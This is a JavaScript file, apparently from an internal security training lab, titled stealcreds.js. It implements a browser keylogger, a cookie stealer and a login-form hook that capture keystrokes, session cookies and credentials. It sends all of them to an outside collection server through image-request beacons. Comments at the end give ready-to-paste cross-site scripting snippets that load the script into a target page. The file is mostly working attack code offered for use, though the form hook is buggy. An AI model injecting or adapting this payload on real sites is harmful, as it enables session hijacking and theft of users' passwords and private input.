var buffer = [];
var category='default';
//var urlroot = 'http://sprg-tools.el.eee.intern/';
var urlroot = 'http://localhost:9090/';

window.console.info('document.cookie : ' + document.cookie);

function installKeylogger(cat) {
    category = cat;
    document.onkeypress = function (e) {
        var timestamp = Date.now() | 0;
        var stroke = {
            k: e.key,
            t: timestamp
        };
        buffer.push(stroke);
    }
    window.console.log('keylogger installed.');
    window.setInterval(function () {
        if (buffer.length > 0) {
            sendToLogService(buffer);
            buffer = [];
        }
    }, 200);
}

function stealCookie(cat) {
    category = cat;
    var text = document.cookie;
    var data = [{k:text,t:Date.now() | 0}];
    sendToLogService(data);
    window.console.log('document.cookie sent.');
}

//unfortunately does not with chrome browser :(
//because the script cannot access the dom
function installSubmitListener(cat) {
    category = cat;
    var loginform = document.forms[0];
    window.console.log('loginform : ' + loginform);
    loginform.onsubmit = function() {
        var username = document.getElementById('username');
        var password = document.getElementById('password');
        var text = username + ':' + password;
        var data = [{k:text,t:Date.now() | 0}];
        sendToLogService(data);
        window.console.log('loginform.onsubmit sent.');
        return false;
    }
    window.console.log('loginform.onsubmit installed.');
}

function sendToLogService(jsondata) {
    var data = encodeURIComponent(JSON.stringify(jsondata));
    var url = urlroot + '/log/' + category + '/' + data;
    new Image().src = url;
    window.console.log('data sent, url : ' + url);
}

//!! it has to be in this
//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installKeylogger('yourname')</script>
//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installSubmitListener('yourname',document.forms[0])</script>
//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installKeylogger('yourname')</script>
//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installSubmitListener('yourname',document.getElementById('loginform'))</script>